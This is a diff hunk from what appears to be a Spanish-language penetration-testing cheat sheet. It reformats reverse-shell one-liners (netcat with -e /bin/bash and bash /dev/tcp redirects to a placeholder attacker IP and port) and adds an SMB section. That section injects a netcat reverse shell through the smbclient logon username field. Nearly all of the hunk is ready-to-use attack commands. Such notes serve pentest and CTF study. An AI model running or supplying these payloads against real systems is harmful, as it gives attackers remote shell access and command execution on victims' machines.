@@ -31,9 +31,15 @@ como ejemplo usaremos **NetCat**: ```nc -lnvp <PORT>```
 
 Y luego usar alguno de los siguientes comandos
 
-* ``` nc -e /bin/bash <MY_IP> <PORT> ```
-* ``` bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1 ```
-* ``` bash -c "bash -i >& /dev/tcp/<MY_IP>/<PORT> 0>&1" ```
+> nc -e /bin/bash <IP> <PORT>
+
+> bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
+
+> bash -c "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1" ```
+
+#### SMB
+Dentro de una consola de smb, usando por ejemplo smbclient
+> logon "./=\`nohup nc -e /bin/bash \<IP> \<PORT>`"
 
 
 ## Privilege Escalation
